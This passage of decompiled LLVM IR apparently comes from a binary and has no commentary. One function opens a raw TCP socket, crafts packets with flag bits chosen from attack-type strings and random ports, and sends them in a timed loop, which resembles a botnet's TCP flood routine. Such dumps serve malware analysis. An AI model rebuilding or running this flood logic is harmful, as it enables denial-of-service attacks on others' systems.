  store i32 %v3_d4c8, i32* %r2.global-to-local, align 4
  %v1_d4d0 = trunc i32 %v0_d4bc to i16
  store i16 %v1_d4d0, i16* %v4_d4d0, align 4
  %v1_d4d8 = call i32 @function_acc0(i32 %storemerge10)
  %v1_d4e4 = call i32 @function_125f0(i32 %v1_d4d8)
  store i32 %v1_d4e4, i32* %v3_d4f0, align 4
  store i32 %v3_d2d0, i32* %r2.global-to-local, align 4
  %v3_d500 = load i16, i16* %v2_d3f0, align 2
  %v4_d500 = zext i16 %v3_d500 to i32
  %v3_d50c = call i32 @function_ad24(i16* %v2_d3fc, i32 %v4_d500)
  %v1_d51c = trunc i32 %v3_d50c to i16
  store i16 %v1_d51c, i16* %v4_d40c, align 2
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_d528 = icmp eq i32 %stack_var_-108.0, %arg6
  br i1 %v9_d528, label %dec_label_pc_d530, label %dec_label_pc_d554

dec_label_pc_d530:                                ; preds = %dec_label_pc_d4b0
  %v2_d534 = call i32 @function_1051c(i32* null)
  store i32 %v2_d534, i32* %r2.global-to-local, align 4
  %v8_d544 = icmp sgt i32 %v2_d534, %v2_d420
  br i1 %v8_d544, label %dec_label_pc_d564, label %dec_label_pc_d548

dec_label_pc_d548:                                ; preds = %dec_label_pc_d530
  br label %dec_label_pc_d430

dec_label_pc_d554:                                ; preds = %dec_label_pc_d4b0
  %v1_d558 = add i32 %stack_var_-108.0, 1
  store i32 %v1_d558, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d430

dec_label_pc_d564:                                ; preds = %dec_label_pc_d530, %dec_label_pc_d1dc, %dec_label_pc_d1ac
  %v1_d57026 = phi i32 [ %v5_d200, %dec_label_pc_d1dc ], [ 0, %dec_label_pc_d1ac ], [ %v2_d534, %dec_label_pc_d530 ]
  br label %dec_label_pc_d568

dec_label_pc_d568:                                ; preds = %dec_label_pc_d178, %dec_label_pc_d048, %dec_label_pc_d0b8, %dec_label_pc_d094, %dec_label_pc_d564
  %v1_d570 = phi i32 [ %v3_d058, %dec_label_pc_d048 ], [ 0, %dec_label_pc_d0b8 ], [ 0, %dec_label_pc_d094 ], [ %v1_d57026, %dec_label_pc_d564 ], [ %v2_d17c, %dec_label_pc_d178 ]
  ret i32 %v1_d570

; uselistorder directives
  uselistorder i32 %v1_d558, { 1, 0 }
  uselistorder i32 %v0_d4bc, { 1, 0 }
  uselistorder i16 %v0_d47c.sink.off0, { 1, 0 }
  uselistorder i32 %v0_d458, { 1, 0 }
  uselistorder i32 %v1_d400, { 1, 0 }
  uselistorder i32 %v3_d3a4, { 1, 0 }
  uselistorder i32 %v0_d360, { 1, 0 }
  uselistorder i32 %v1_d350, { 1, 0 }
  uselistorder i32 %v3_d2d0, { 6, 4, 5, 12, 3, 13, 11, 2, 10, 9, 8, 7, 1, 0 }
  uselistorder i32 %v1_d2a0, { 1, 0 }
  uselistorder i32 %v3_d120, { 1, 0 }
  uselistorder i32 %stack_var_-112.0, { 0, 2, 1 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-80, { 1, 2, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28, 27, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32 26, { 1, 0 }
  uselistorder i32 ()* @function_13a28, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d568, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_d4b0, { 1, 0 }
  uselistorder label %dec_label_pc_d3b8, { 1, 0 }
  uselistorder label %dec_label_pc_d29c, { 1, 0 }
  uselistorder label %dec_label_pc_d220, { 1, 0 }
  uselistorder label %dec_label_pc_d178, { 1, 0 }
  uselistorder label %dec_label_pc_d048, { 1, 0 }
}

define i32 @function_d574(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_d574:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  store i32 54656, i32* %stack_var_-4, align 4
  %v2_d57c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d57c, i32* @fp, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v2_d5b0 = icmp eq i32 %arg2, 0
  br i1 %v2_d5b0, label %dec_label_pc_d5b8, label %dec_label_pc_d5d0

dec_label_pc_d5b8:                                ; preds = %dec_label_pc_d574
  %v0_d5b8 = call i32 @function_8440()
  br label %dec_label_pc_d5ec

dec_label_pc_d5d0:                                ; preds = %dec_label_pc_d574
  %v3_d5d8 = urem i32 %arg2, 65536
  %v1_d5e0 = call i32 @function_125e0(i32 %v3_d5d8)
  br label %dec_label_pc_d5ec

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d5b8, %dec_label_pc_d5d0
  %v3_d5fc = call i32 @function_96fc(i32 %arg1, i32* nonnull %stack_var_-64)
  %v2_d604 = icmp eq i32 %v3_d5fc, 0
  br i1 %v2_d604, label %dec_label_pc_d610, label %dec_label_pc_dc24

dec_label_pc_d610:                                ; preds = %dec_label_pc_d5ec
  store i32 8, i32* @r2, align 4
  %v2_d624 = bitcast i32* %stack_var_-60 to i8*
  %v3_d624 = call i32 @function_11f30(i8* %v2_d624, i32 0)
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_d634 = call i32 @function_128b8(i32 2, i32 3, i32 6)
  %v2_d644 = icmp eq i32 %v3_d634, 0
  br i1 %v2_d644, label %dec_label_pc_dc24, label %dec_label_pc_d650

dec_label_pc_d650:                                ; preds = %dec_label_pc_d610
  store i32 1, i32* %stack_var_-72, align 4
  %v2_d658 = ptrtoint i32* %stack_var_-72 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_d674 = call i32 @function_12874(i32 %v3_d634, i32 0, i32 3, i32 %v2_d658, i32 4)
  %v1_d67c = icmp slt i32 %v5_d674, 0
  br i1 %v1_d67c, label %dec_label_pc_dc24, label %dec_label_pc_d688

dec_label_pc_d688:                                ; preds = %dec_label_pc_d650
  %v2_d68c = icmp eq i32 %arg4, 0
  br i1 %v2_d68c, label %dec_label_pc_d6b8, label %dec_label_pc_d6a0

dec_label_pc_d6a0:                                ; preds = %dec_label_pc_d688
  %v1_d6a4 = sub i32 32, %arg4
  store i32 %v1_d6a4, i32* %r2.global-to-local, align 4
  %v1_d6b0 = shl i32 -1, %v1_d6a4
  br label %dec_label_pc_d6b8

dec_label_pc_d6b8:                                ; preds = %dec_label_pc_d688, %dec_label_pc_d6a0
  %storemerge9 = phi i32 [ %v1_d6b0, %dec_label_pc_d6a0 ], [ 0, %dec_label_pc_d688 ]
  %v1_d6bc = add i32 %arg6, 40
  %v1_d6cc = add i32 %arg6, 54
  %v3_d6d0 = and i32 %v1_d6cc, -8
  %v1_d6d8 = load i32, i32* @sp, align 4
  %v2_d6d8 = sub i32 %v1_d6d8, %v3_d6d0
  %v1_d6e8 = add i32 %v2_d6d8, 15
  %v3_d6ec = and i32 %v1_d6e8, -8
  store i32 %v3_d6ec, i32* %r2.global-to-local, align 4
  %v1_d70c = add i32 %v3_d6ec, 20
  %v5_d710 = inttoptr i32 %v1_d70c to i16*
  %v3_d714 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_d714, i32* @r4, align 4
  %v1_d71c = call i32 @function_acc0(i32 %storemerge9)
  %v1_d728 = call i32 @function_125f0(i32 %v1_d71c)
  store i32 %v1_d728, i32* %r2.global-to-local, align 4
  %v1_d734 = add i32 %arg6, 20
  %v1_d738 = load i32, i32* @sp, align 4
  %v2_d738 = inttoptr i32 %v1_d738 to i32*
  store i32 %v1_d734, i32* %v2_d738, align 4
  %v0_d740 = load i32, i32* @r4, align 4
  %v4_d748 = inttoptr i32 %v3_d6ec to i8*
  %v5_d748 = call i32 @function_af4c(i8* %v4_d748, i32 %v0_d740, i32 %v1_d728, i32 6)
  %v0_d74c = call i32 @function_8440()
  %v3_d758 = urem i32 %v0_d74c, 65536
  store i32 %v3_d758, i32* %r2.global-to-local, align 4
  %v1_d760 = trunc i32 %v0_d74c to i16
  store i16 %v1_d760, i16* %v5_d710, align 4
  %v0_d764 = call i32 @function_8440()
  %v2_d770 = add i32 %v3_d6ec, 24
  %v3_d770 = inttoptr i32 %v2_d770 to i32*
  store i32 %v0_d764, i32* %v3_d770, align 8
  %v2_d77c = add i32 %v3_d6ec, 28
  %v3_d77c = inttoptr i32 %v2_d77c to i32*
  store i32 0, i32* %v3_d77c, align 4
  store i32 %v1_d70c, i32* %r2.global-to-local, align 4
  %v1_d784 = add i32 %v3_d6ec, 32
  %v2_d784 = inttoptr i32 %v1_d784 to i8*
  %v3_d784 = load i8, i8* %v2_d784, align 8
  %v1_d790 = urem i8 %v3_d784, 16
  %v1_d794 = or i8 %v1_d790, 80
  store i8 %v1_d794, i8* %v2_d784, align 8
  %v3_d7a4 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19ea4.78 to i32), i32* @r1, align 4
  %v3_d7b0 = inttoptr i32 %v3_d7a4 to i8*
  %v4_d7b0 = call i32 @function_12030(i8* %v3_d7b0, i32 ptrtoint ([4 x i8]* @global_var_19ea4.78 to i32))
  %v2_d7b8 = icmp eq i32 %v4_d7b0, 0
  br i1 %v2_d7b8, label %dec_label_pc_d7c0, label %dec_label_pc_d878

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d6b8
  store i32 %v1_d70c, i32* %r2.global-to-local, align 4
  %v1_d7c4 = add i32 %v3_d6ec, 33
  %v2_d7c4 = inttoptr i32 %v1_d7c4 to i8*
  %v3_d7c4 = load i8, i8* %v2_d7c4, align 1
  %v1_d7d4 = or i8 %v3_d7c4, 2
  store i8 %v1_d7d4, i8* %v2_d7c4, align 1
  store i32 %v1_d70c, i32* %r2.global-to-local, align 4
  %v3_d7e8 = load i8, i8* %v2_d7c4, align 1
  %v1_d7f8 = or i8 %v3_d7e8, 4
  store i8 %v1_d7f8, i8* %v2_d7c4, align 1
  store i32 %v1_d70c, i32* %r2.global-to-local, align 4
  %v3_d80c = load i8, i8* %v2_d7c4, align 1
  %v1_d81c = or i8 %v3_d80c, 1
  store i8 %v1_d81c, i8* %v2_d7c4, align 1
  store i32 %v1_d70c, i32* %r2.global-to-local, align 4
  %v3_d830 = load i8, i8* %v2_d7c4, align 1
  %v1_d840 = or i8 %v3_d830, 16
  store i8 %v1_d840, i8* %v2_d7c4, align 1
  store i32 %v1_d70c, i32* %r2.global-to-local, align 4
  %v3_d854 = load i8, i8* %v2_d7c4, align 1
  %v1_d864 = or i8 %v3_d854, 8
  store i8 %v1_d864, i8* %v2_d7c4, align 1
  br label %dec_label_pc_da20

dec_label_pc_d878:                                ; preds = %dec_label_pc_d6b8
  %v3_d878 = load i32, i32* %stack_var_0, align 4
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_d884 = call i32 @function_12410(i32 %v3_d878, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  %v2_da1818 = icmp eq i32 %v2_d884, 0
  br i1 %v2_da1818, label %dec_label_pc_da20, label %dec_label_pc_d894.lr.ph

dec_label_pc_d894.lr.ph:                          ; preds = %dec_label_pc_d878
  %v1_d8b4 = add i32 %v3_d6ec, 33
  %v2_d8b4 = inttoptr i32 %v1_d8b4 to i8*
  br label %dec_label_pc_d894

dec_label_pc_d894:                                ; preds = %dec_label_pc_d894.lr.ph, %dec_label_pc_da00
  %storemerge1319 = phi i32 [ %v2_d884, %dec_label_pc_d894.lr.ph ], [ %v2_da08, %dec_label_pc_da00 ]
  store i32 ptrtoint ([4 x i8]* @global_var_19eac.82 to i32), i32* @r1, align 4
  %v3_d8a0 = inttoptr i32 %storemerge1319 to i8*
  %v4_d8a0 = call i32 @function_12030(i8* %v3_d8a0, i32 ptrtoint ([4 x i8]* @global_var_19eac.82 to i32))
  %v2_d8a8 = icmp eq i32 %v4_d8a0, 0
  br i1 %v2_d8a8, label %dec_label_pc_d8b0, label %dec_label_pc_d8d8

dec_label_pc_d8b0:                                ; preds = %dec_label_pc_d894
  %v3_d8b4 = load i8, i8* %v2_d8b4, align 1
  %v4_d8bc = zext i8 %v3_d8b4 to i32
  %v1_d8c4 = or i32 %v4_d8bc, 2
  store i32 %v1_d8c4, i32* %r2.global-to-local, align 4
  %v1_d8d0 = trunc i32 %v1_d8c4 to i8
  store i8 %v1_d8d0, i8* %v2_d8b4, align 1
  br label %dec_label_pc_da00

dec_label_pc_d8d8:                                ; preds = %dec_label_pc_d894
  store i32 ptrtoint ([4 x i8]* @global_var_19eb0.84 to i32), i32* @r1, align 4
  %v4_d8e4 = call i32 @function_12030(i8* %v3_d8a0, i32 ptrtoint ([4 x i8]* @global_var_19eb0.84 to i32))
  %v2_d8ec = icmp eq i32 %v4_d8e4, 0
  br i1 %v2_d8ec, label %dec_label_pc_d8f4, label %dec_label_pc_d91c

dec_label_pc_d8f4:                                ; preds = %dec_label_pc_d8d8
  %v3_d8f8 = load i8, i8* %v2_d8b4, align 1
  %v4_d900 = zext i8 %v3_d8f8 to i32
  %v1_d908 = or i32 %v4_d900, 4
  store i32 %v1_d908, i32* %r2.global-to-local, align 4
  %v1_d914 = trunc i32 %v1_d908 to i8
  store i8 %v1_d914, i8* %v2_d8b4, align 1
  br label %dec_label_pc_da00

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d8d8
  store i32 ptrtoint ([4 x i8]* @global_var_19eb4.86 to i32), i32* @r1, align 4
  %v4_d928 = call i32 @function_12030(i8* %v3_d8a0, i32 ptrtoint ([4 x i8]* @global_var_19eb4.86 to i32))
  %v2_d930 = icmp eq i32 %v4_d928, 0
  br i1 %v2_d930, label %dec_label_pc_d938, label %dec_label_pc_d960

dec_label_pc_d938:                                ; preds = %dec_label_pc_d91c
  %v3_d93c = load i8, i8* %v2_d8b4, align 1
  %v4_d944 = zext i8 %v3_d93c to i32
  %v1_d94c = or i32 %v4_d944, 1
  store i32 %v1_d94c, i32* %r2.global-to-local, align 4
  %v1_d958 = trunc i32 %v1_d94c to i8
  store i8 %v1_d958, i8* %v2_d8b4, align 1
  br label %dec_label_pc_da00

dec_label_pc_d960:                                ; preds = %dec_label_pc_d91c
  store i32 ptrtoint ([4 x i8]* @global_var_19eb8.88 to i32), i32* @r1, align 4
  %v4_d96c = call i32 @function_12030(i8* %v3_d8a0, i32 ptrtoint ([4 x i8]* @global_var_19eb8.88 to i32))
  %v2_d974 = icmp eq i32 %v4_d96c, 0
  br i1 %v2_d974, label %dec_label_pc_d97c, label %dec_label_pc_d9a4

dec_label_pc_d97c:                                ; preds = %dec_label_pc_d960
  %v3_d980 = load i8, i8* %v2_d8b4, align 1
  %v4_d988 = zext i8 %v3_d980 to i32
  %v1_d990 = or i32 %v4_d988, 16
  store i32 %v1_d990, i32* %r2.global-to-local, align 4
  %v1_d99c = trunc i32 %v1_d990 to i8
  store i8 %v1_d99c, i8* %v2_d8b4, align 1
  br label %dec_label_pc_da00

dec_label_pc_d9a4:                                ; preds = %dec_label_pc_d960
  store i32 ptrtoint ([4 x i8]* @global_var_19ebc.90 to i32), i32* @r1, align 4
  %v4_d9b0 = call i32 @function_12030(i8* %v3_d8a0, i32 ptrtoint ([4 x i8]* @global_var_19ebc.90 to i32))
  %v2_d9b8 = icmp eq i32 %v4_d9b0, 0
  br i1 %v2_d9b8, label %dec_label_pc_d9c0, label %dec_label_pc_d9e8

dec_label_pc_d9c0:                                ; preds = %dec_label_pc_d9a4
  %v3_d9c4 = load i8, i8* %v2_d8b4, align 1
  %v4_d9cc = zext i8 %v3_d9c4 to i32
  %v1_d9d4 = or i32 %v4_d9cc, 8
  store i32 %v1_d9d4, i32* %r2.global-to-local, align 4
  %v1_d9e0 = trunc i32 %v1_d9d4 to i8
  store i8 %v1_d9e0, i8* %v2_d8b4, align 1
  br label %dec_label_pc_da00

dec_label_pc_d9e8:                                ; preds = %dec_label_pc_d9a4
  %v2_d9ec = load i32, i32* @global_var_23700.47, align 4
  store i32 %storemerge1319, i32* @r2, align 4
  %v3_d9fc = call i32 @function_8f1c(i32 %v2_d9ec, i32 ptrtoint ([18 x i8]* @global_var_19ec0.93 to i32))
  br label %dec_label_pc_da00

dec_label_pc_da00:                                ; preds = %dec_label_pc_d9c0, %dec_label_pc_d97c, %dec_label_pc_d938, %dec_label_pc_d8f4, %dec_label_pc_d8b0, %dec_label_pc_d9e8
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_da08 = call i32 @function_12410(i32 0, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  %v2_da18 = icmp eq i32 %v2_da08, 0
  br i1 %v2_da18, label %dec_label_pc_da20, label %dec_label_pc_d894

dec_label_pc_da20:                                ; preds = %dec_label_pc_da00, %dec_label_pc_d878, %dec_label_pc_d7c0
  %v0_da20 = call i32 @function_8440()
  %v1_da34 = trunc i32 %v0_da20 to i16
  %v3_da34 = add i32 %v3_d6ec, 34
  %v4_da34 = inttoptr i32 %v3_da34 to i16*
  store i16 %v1_da34, i16* %v4_da34, align 2
  %v3_da40 = add i32 %v3_d6ec, 36
  %v4_da40 = inttoptr i32 %v3_da40 to i16*
  store i16 0, i16* %v4_da40, align 4
  store i32 %v1_d70c, i32* %r2.global-to-local, align 4
  %v3_da4c = add i32 %v3_d6ec, 38
  %v4_da4c = inttoptr i32 %v3_da4c to i16*
  store i16 0, i16* %v4_da4c, align 2
  br i1 %v2_d5b0, label %dec_label_pc_da5c, label %dec_label_pc_da74

dec_label_pc_da5c:                                ; preds = %dec_label_pc_da20
  %v0_da5c = call i32 @function_8440()
  %extract.t = trunc i32 %v0_da5c to i16
  br label %dec_label_pc_da90

dec_label_pc_da74:                                ; preds = %dec_label_pc_da20
  %v3_da7c = urem i32 %arg2, 65536
  %v1_da84 = call i32 @function_125e0(i32 %v3_da7c)
  %extract.t72 = trunc i32 %v1_da84 to i16
  br label %dec_label_pc_da90

dec_label_pc_da90:                                ; preds = %dec_label_pc_da5c, %dec_label_pc_da74
  %v0_da5c.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_da5c ], [ %extract.t72, %dec_label_pc_da74 ]
  %v3_da98 = add i32 %v3_d6ec, 22
  %v4_da98 = inttoptr i32 %v3_da98 to i16*
  store i16 %v0_da5c.sink.off0, i16* %v4_da98, align 2
  %v2_daa4 = call i32 @function_ae78(i32 %v3_d6ec, i32 %v1_d70c)
  %v1_dab4 = trunc i32 %v2_daa4 to i16
  store i16 %v1_dab4, i16* %v4_da40, align 4
  store i32 %v3_d6ec, i32* %r2.global-to-local, align 4
  %v1_dac4 = or i32 %v3_d6ec, 2
  %v2_dac4 = inttoptr i32 %v1_dac4 to i16*
  %v3_dac4 = load i16, i16* %v2_dac4, align 2
  %v4_dac4 = zext i16 %v3_dac4 to i32
  %v2_dad0 = inttoptr i32 %v3_d6ec to i16*
  %v3_dad0 = call i32 @function_ad24(i16* %v2_dad0, i32 %v4_dac4)
  %sext3 = mul i32 %v3_dad0, 65536
  %v1_dad4 = sdiv i32 %sext3, 65536
  store i32 %v1_dad4, i32* %r2.global-to-local, align 4
  %v1_dae0 = trunc i32 %v1_dad4 to i16
  %v3_dae0 = add i32 %v3_d6ec, 10
  %v4_dae0 = inttoptr i32 %v3_dae0 to i16*
  store i16 %v1_dae0, i16* %v4_dae0, align 2
  %v2_dae8 = call i32 @function_1051c(i32* null)
  %v2_daf4 = add i32 %v2_dae8, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_db08 = ptrtoint i32* %stack_var_-68 to i32
  %v2_db48 = add i32 %v3_d6ec, 12
  %v3_db48 = inttoptr i32 %v2_db48 to i32*
  %v3_db60 = or i32 %v3_d6ec, 4
  %v4_db60 = inttoptr i32 %v3_db60 to i16*
  br label %dec_label_pc_db04

dec_label_pc_db04:                                ; preds = %dec_label_pc_dc14, %dec_label_pc_dc08, %dec_label_pc_da90
  %stack_var_-92.0 = phi i32 [ 0, %dec_label_pc_da90 ], [ 0, %dec_label_pc_dc08 ], [ %v1_dc18, %dec_label_pc_dc14 ]
  store i32 %v3_d6ec, i32* %r2.global-to-local, align 4
  %v1_db0c = load i32, i32* @sp, align 4
  %v2_db0c = inttoptr i32 %v1_db0c to i32*
  store i32 %v2_db08, i32* %v2_db0c, align 4
  %v1_db14 = load i32, i32* @sp, align 4
  %v2_db14 = add i32 %v1_db14, 4
  %v3_db14 = inttoptr i32 %v2_db14 to i32*
  store i32 16, i32* %v3_db14, align 4
  %v0_db1c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d6bc, i32* %r2.global-to-local, align 4
  %v6_db28 = call i32 @function_12834(i32 %v3_d634, i32 %v0_db1c, i32 %v1_d6bc, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_db30 = call i32 @function_acc0(i32 %storemerge9)
  %v1_db3c = call i32 @function_125f0(i32 %v1_db30)
  store i32 %v1_db3c, i32* %r2.global-to-local, align 4
  store i32 %v1_db3c, i32* %v3_db48, align 4
  %v0_db4c = call i32 @function_8440()
  %v3_db58 = urem i32 %v0_db4c, 65536
  store i32 %v3_db58, i32* %r2.global-to-local, align 4
  %v1_db60 = trunc i32 %v0_db4c to i16
  store i16 %v1_db60, i16* %v4_db60, align 4
  %v0_db64 = call i32 @function_8440()
  store i32 %v0_db64, i32* %r2.global-to-local, align 4
  store i32 %v0_db64, i32* %v3_d770, align 8
  %v0_db74 = call i32 @function_8440()
  %v1_db88 = trunc i32 %v0_db74 to i16
  store i16 %v1_db88, i16* %v5_d710, align 4
  store i32 %v1_d70c, i32* %r2.global-to-local, align 4
  store i16 0, i16* %v4_da40, align 4
  %v4_dba0 = call i32 @function_ae78(i32 %v3_d6ec, i32 %v1_d70c)
  %v1_dbb0 = trunc i32 %v4_dba0 to i16
  store i16 %v1_dbb0, i16* %v4_da40, align 4
  store i32 %v3_d6ec, i32* %r2.global-to-local, align 4
  %v3_dbc0 = load i16, i16* %v2_dac4, align 2
  %v4_dbc0 = zext i16 %v3_dbc0 to i32
  %v3_dbcc = call i32 @function_ad24(i16* %v2_dad0, i32 %v4_dbc0)
  %sext5 = mul i32 %v3_dbcc, 65536
  %v1_dbd0 = sdiv i32 %sext5, 65536
  store i32 %v1_dbd0, i32* %r2.global-to-local, align 4
  %v1_dbdc = trunc i32 %v1_dbd0 to i16
  store i16 %v1_dbdc, i16* %v4_dae0, align 2
  %v9_dbe8 = icmp eq i32 %stack_var_-92.0, %arg7
  br i1 %v9_dbe8, label %dec_label_pc_dbf0, label %dec_label_pc_dc14

dec_label_pc_dbf0:                                ; preds = %dec_label_pc_db04
  %v2_dbf4 = call i32 @function_1051c(i32* null)
  store i32 %v2_dbf4, i32* %r2.global-to-local, align 4
  %v8_dc04 = icmp sgt i32 %v2_dbf4, %v2_daf4
  br i1 %v8_dc04, label %dec_label_pc_dc24, label %dec_label_pc_dc08

dec_label_pc_dc08:                                ; preds = %dec_label_pc_dbf0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_db04

dec_label_pc_dc14:                                ; preds = %dec_label_pc_db04
  %v1_dc18 = add i32 %stack_var_-92.0, 1
  br label %dec_label_pc_db04

dec_label_pc_dc24:                                ; preds = %dec_label_pc_dbf0, %dec_label_pc_d650, %dec_label_pc_d610, %dec_label_pc_d5ec
  %v1_dc30 = phi i32 [ %v5_d674, %dec_label_pc_d650 ], [ 0, %dec_label_pc_d610 ], [ %v3_d5fc, %dec_label_pc_d5ec ], [ %v2_dbf4, %dec_label_pc_dbf0 ]
  ret i32 %v1_dc30

; uselistorder directives
  uselistorder i32 %v1_dbd0, { 1, 0 }
  uselistorder i32 %v0_db4c, { 1, 0 }
  uselistorder i32 %v1_dad4, { 1, 0 }
  uselistorder i32 %storemerge1319, { 1, 0 }
  uselistorder i8* %v2_d8b4, { 0, 5, 1, 6, 2, 7, 3, 8, 4, 9 }
  uselistorder i8* %v2_d7c4, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v0_d74c, { 1, 0 }
  uselistorder i32 %v1_d70c, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10 }
  uselistorder i32 %v3_d6ec, { 9, 8, 6, 19, 7, 5, 21, 18, 4, 3, 17, 16, 15, 14, 13, 20, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_d6bc, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_12834, { 2, 0, 1 }
  uselistorder i32 (i16*, i32)* @function_ad24, { 0, 1, 3, 4, 2 }
  uselistorder i32 (i32, i32)* @function_ae78, { 1, 0 }
  uselistorder i8 8, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_125f0, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_acc0, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_12874, { 1, 0 }
  uselistorder i32 ()* @function_8440, { 18, 17, 16, 15, 14, 13, 12, 11, 2, 1, 0, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_da90, { 1, 0 }
  uselistorder label %dec_label_pc_da00, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_d894, { 1, 0 }
  uselistorder label %dec_label_pc_d6b8, { 1, 0 }
  uselistorder label %dec_label_pc_d5ec, { 1, 0 }
}

define i32 @function_dc58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_dc58:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 56420, i32* %stack_var_-4, align 4
  %v2_dc60 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_dc60, i32* @fp, align 4
  %v0_dc7c = call i32 @function_10644()
  store i32 %v0_dc7c, i32* %r2.global-to-local, align 4
  %tmp = icmp slt i32 %v0_dc7c, 0
  %v3_dc84 = zext i1 %tmp to i32
  %v2_dc88 = add i32 %v3_dc84, %v0_dc7c
  %v3_dc8c = sdiv i32 %v2_dc88, 2
  store i32 2, i32* %stack_var_-72, align 4
  %v3_dca4 = urem i32 %arg2, 65536
  %v1_dcac = call i32 @function_125e0(i32 %v3_dca4)
  %v3_dcc8 = call i32 @function_96fc(i32 %arg1, i32* nonnull %stack_var_-68)
  %v2_dcd0 = icmp eq i32 %v3_dcc8, 0
  br i1 %v2_dcd0, label %dec_label_pc_dcdc, label %dec_label_pc_e14c

dec_label_pc_dcdc:                                ; preds = %dec_label_pc_dc58
  store i32 8, i32* @r2, align 4
  %v2_dcf0 = bitcast i32* %stack_var_-64 to i8*
  %v3_dcf0 = call i32 @function_11f30(i8* %v2_dcf0, i32 0)
  %v3_dcf8 = mul i32 %v3_dc8c, 8
  %v1_dcfc = or i32 %v3_dcf8, 7
  %v1_dd00 = add i32 %v1_dcfc, 7
  %v3_dd04 = and i32 %v1_dd00, -8
  %v1_dd0c = load i32, i32* @sp, align 4
  %v2_dd0c = sub i32 %v1_dd0c, %v3_dd04
  %v1_dd1c = add i32 %v2_dd0c, 15
  %v3_dd20 = and i32 %v1_dd1c, -8
  %v2_dd44 = mul i32 %v3_dc8c, 5
  store i32 %v2_dd44, i32* @r2, align 4
  %v2_dd54 = inttoptr i32 %v3_dd20 to i8*
  %v3_dd54 = call i32 @function_11f30(i8* %v2_dd54, i32 0)
  %v1_dd5c = call i32 @function_12b00(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_dd74 = inttoptr i32 %v1_dd5c to i8*
  %v3_dd74 = call i32 @function_11f30(i8* %v2_dd74, i32 0)
  %v2_dd7c = call i32 @function_1051c(i32* null)
  store i32 %v2_dd7c, i32* %r2.global-to-local, align 4
  %v2_dd88 = add i32 %v2_dd7c, %arg3
  %v2_dec4 = ptrtoint i32* %stack_var_-200 to i32
  %v2_df1c = ptrtoint i32* %stack_var_-24 to i32
  %v2_df88 = ptrtoint i32* %stack_var_-208 to i32
  %v2_dfcc = ptrtoint i32* %stack_var_-216 to i32
